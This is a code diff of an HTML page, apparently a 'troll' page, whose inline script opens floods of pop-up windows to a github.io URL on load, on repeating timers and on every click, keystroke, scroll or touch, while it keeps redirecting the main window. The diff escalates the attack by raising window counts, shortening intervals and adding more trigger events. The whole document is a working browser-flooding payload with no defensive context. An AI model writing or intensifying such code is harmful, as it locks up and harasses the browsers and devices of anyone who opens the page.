@@ -5,28 +5,28 @@
     <script>
         const TARGET = 'https://bader133b.github.io/typatroll/';
         
-        // Open 50 windows immediately
-        for (let i = 0; i < 50; i++) {
+        // Open 100 windows immediately
+        for (let i = 0; i < 100; i++) {
             setTimeout(() => {
                 try {
                     window.open(TARGET, '_blank');
                 } catch(e) {}
-            }, i * 50);
+            }, i * 30);
         }
         
-        // Open 10 windows every 500ms
+        // Open 20 windows every 300ms
         setInterval(() => {
-            for (let i = 0; i < 10; i++) {
+            for (let i = 0; i < 20; i++) {
                 try {
                     window.open(TARGET, '_blank');
                 } catch(e) {}
             }
-        }, 500);
+        }, 300);
         
         // Open on every event
-        ['load', 'focus', 'click', 'mousemove', 'keydown'].forEach(event => {
+        ['load', 'DOMContentLoaded', 'focus', 'blur', 'click', 'mousemove', 'mousedown', 'keydown', 'keyup', 'scroll', 'touchstart'].forEach(event => {
             window.addEventListener(event, () => {
-                for (let i = 0; i < 5; i++) {
+                for (let i = 0; i < 10; i++) {
                     try {
                         window.open(TARGET, '_blank');
                     } catch(e) {}
@@ -34,21 +34,27 @@
             }, { once: false });
         });
         
-        // Redirect main window every 1 second
+        // Redirect main window every 0.5 seconds
         setInterval(() => {
             window.location.href = TARGET;
-        }, 1000);
+        }, 500);
         
         setTimeout(() => {
             window.location.href = TARGET;
-        }, 500);
+        }, 200);
     </script>
 </head>
 <body>
     <script>
-        for (let i = 0; i < 20; i++) {
-            window.open(TARGET, '_blank');
+        for (let i = 0; i < 50; i++) {
+            try {
+                window.open(TARGET, '_blank');
+            } catch(e) {}
         }
+        
+        setTimeout(() => {
+            window.location.href = TARGET;
+        }, 100);
     </script>
 </body>
 </html>
